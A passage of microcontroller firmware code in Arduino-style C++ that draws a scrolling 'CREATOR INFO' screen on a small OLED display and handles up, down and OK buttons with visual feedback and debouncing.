  display.drawRect(2, 2, SCREEN_WIDTH-4, SCREEN_HEIGHT-4, WHITE);

  // Title bar
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setTextSize(1);
  display.setCursor(38, 1);
  display.print("CREATOR INFO");

  // Draw info with better styling and scrolling capability
  bool buttonPressed = false;
  while (!buttonPressed) {
    unsigned long currentTime = millis();

    // Update display every 100ms for smooth scrolling
    if (currentTime - lastUpdateTime > 100) {
      display.fillRect(0, 12, SCREEN_WIDTH, SCREEN_HEIGHT-14, BLACK); // Clear display area

      // Draw all info items with scrolling for longer ones
      for (int i = 0; i < NUM_INFO_ITEMS; i++) {
        // Highlight the active item
        if (i == activeItem) {
          display.fillRect(5, 15 + i*12, SCREEN_WIDTH-10, 10, WHITE); // Increased vertical spacing
          scrollText(infoItems[i], 10, 16 + i*12, SCREEN_WIDTH-20, true); // Adjusted Y position
        } else {
          scrollText(infoItems[i], 10, 16 + i*12, SCREEN_WIDTH-20, false); // Adjusted Y position
        }
      }

      // Decorative elements
      display.drawLine(10, 55, SCREEN_WIDTH-10, 55, WHITE);

      // Draw scroll indicators
      if (activeItem > 0) {
        display.fillTriangle(SCREEN_WIDTH-10, 15, SCREEN_WIDTH-5, 15, SCREEN_WIDTH-7, 10, WHITE);
      }
      if (activeItem < NUM_INFO_ITEMS - 1) {
        display.fillTriangle(SCREEN_WIDTH-10, 55, SCREEN_WIDTH-5, 55, SCREEN_WIDTH-7, 60, WHITE);
      }

      display.display();
      lastUpdateTime = currentTime;
    }

    // Handle button presses
    if (digitalRead(BTN_OK) == LOW) {
      buttonPressed = true;
      // Visual feedback
      display.invertDisplay(true);
      delay(50);
      display.invertDisplay(false);
    }

    // Allow scrolling through info items with up/down buttons
    if (digitalRead(BTN_UP) == LOW) {
      if (activeItem > 0) {
        activeItem--;
        // Visual feedback
        display.invertDisplay(true);
        delay(30);
        display.invertDisplay(false);
        delay(150); // Debounce
      }
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      if (activeItem < NUM_INFO_ITEMS - 1) {
        activeItem++;
        // Visual feedback
        display.invertDisplay(true);
        delay(30);
        display.invertDisplay(false);
        delay(150); // Debounce
      }
    }

    delay(10);
  }

  // Wait for button release before returning
  while (digitalRead(BTN_OK) == LOW) {
    delay(50);
  }
  delay(200); // Debounce
}
